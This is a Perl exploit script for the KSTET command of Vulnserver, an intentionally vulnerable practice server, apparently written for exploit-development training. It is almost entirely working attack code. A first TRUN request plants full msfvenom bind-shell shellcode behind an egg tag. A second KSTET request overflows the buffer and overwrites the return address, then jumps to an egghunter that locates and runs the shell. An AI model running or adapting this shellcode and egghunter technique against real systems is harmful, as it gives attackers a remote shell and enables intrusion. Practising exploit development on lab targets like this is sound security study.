#!/usr/bin/perl

# Vulnserver KSTET exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows 7 Professional

use IO::Socket;

$egg = "HAKRHAKR";

# msfvenom -p windows/shell_bind_tcp LPORT=80 EXITFUNC=seh -f perl -v payload -b "\x00\x0a\x0d"
# 355 bytes

$payload = "\xbf\xbc\x89\x2d\xc5\xdd\xc6\xd9\x74\x24\xf4\x5d\x29\xc9" .
"\xb1\x53\x31\x7d\x12\x83\xed\xfc\x03\xc1\x87\xcf\x30\xc5" .
"\x70\x8d\xbb\x35\x81\xf2\x32\xd0\xb0\x32\x20\x91\xe3\x82" .
"\x22\xf7\x0f\x68\x66\xe3\x84\x1c\xaf\x04\x2c\xaa\x89\x2b" .
"\xad\x87\xea\x2a\x2d\xda\x3e\x8c\x0c\x15\x33\xcd\x49\x48" .
"\xbe\x9f\x02\x06\x6d\x0f\x26\x52\xae\xa4\x74\x72\xb6\x59" .
"\xcc\x75\x97\xcc\x46\x2c\x37\xef\x8b\x44\x7e\xf7\xc8\x61" .
"\xc8\x8c\x3b\x1d\xcb\x44\x72\xde\x60\xa9\xba\x2d\x78\xee" .
"\x7d\xce\x0f\x06\x7e\x73\x08\xdd\xfc\xaf\x9d\xc5\xa7\x24" .
"\x05\x21\x59\xe8\xd0\xa2\x55\x45\x96\xec\x79\x58\x7b\x87" .
"\x86\xd1\x7a\x47\x0f\xa1\x58\x43\x4b\x71\xc0\xd2\x31\xd4" .
"\xfd\x04\x9a\x89\x5b\x4f\x37\xdd\xd1\x12\x50\x12\xd8\xac" .
"\xa0\x3c\x6b\xdf\x92\xe3\xc7\x77\x9f\x6c\xce\x80\xe0\x46" .
"\xb6\x1e\x1f\x69\xc7\x37\xe4\x3d\x97\x2f\xcd\x3d\x7c\xaf" .
"\xf2\xeb\xe9\xa7\x55\x44\x0c\x4a\x25\x34\x90\xe4\xce\x5e" .
"\x1f\xdb\xef\x60\xf5\x74\x87\x9c\xf6\x7a\x08\x28\x10\x10" .
"\xb8\x7c\x8a\x8c\x7a\x5b\x03\x2b\x84\x89\x3b\xdb\xcd\xdb" .
"\xfc\xe4\xcd\xc9\xaa\x72\x46\x1e\x6f\x63\x59\x0b\xc7\xf4" .
"\xce\xc1\x86\xb7\x6f\xd5\x82\x2f\x13\x44\x49\xaf\x5a\x75" .
"\xc6\xf8\x0b\x4b\x1f\x6c\xa6\xf2\x89\x92\x3b\x62\xf1\x16" .
"\xe0\x57\xfc\x97\x65\xe3\xda\x87\xb3\xec\x66\xf3\x6b\xbb" .
"\x30\xad\xcd\x15\xf3\x07\x84\xca\x5d\xcf\x51\x21\x5e\x89" .
"\x5d\x6c\x28\x75\xef\xd9\x6d\x8a\xc0\x8d\x79\xf3\x3c\x2e" .
"\x85\x2e\x85\x50\x77\xe2\x10\xc4\x2e\x97\x58\x88\xd0\x42" .
"\x9e\xb5\x52\x66\x5f\x42\x4a\x03\x5a\x0e\xcc\xf8\x16\x1f" .
"\xb9\xfe\x85\x20\xe8";

$egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05" .
"\x5a\x74\xef\xb8\x48\x41\x4b\x52\x89\xd7\xaf\x75\xea\xaf" .
"\x75\xe7\xff\xe7";

# stage 1 drops the egg and payload

$badheader1 = "TRUN ";
$baddata1 = "\x41" x 750;

$baddata1 .= $egg.$payload;

# stage 2 drops the egghunter using the KSTET command

$badheader2 = "KSTET /.:/";
$baddata2 = "\x42" x 10; # exact offset match at 66
$baddata2 .= "\x90" x 12;
$baddata2 .= $egghunter;
$baddata2 .= "\x90" x 12; 
$baddata2 .= "\xaf\x11\x50\x62";
$baddata2 .= "\xeb\xCD\x90\x90";
$baddata2 .= "\x44" x (5000-length($baddata2));

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader1.$baddata1);

$socket2=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

sleep(3);

$socket2->recv($sd,1024);
print $sd;
$socket2->send($badheader2.$baddata2);
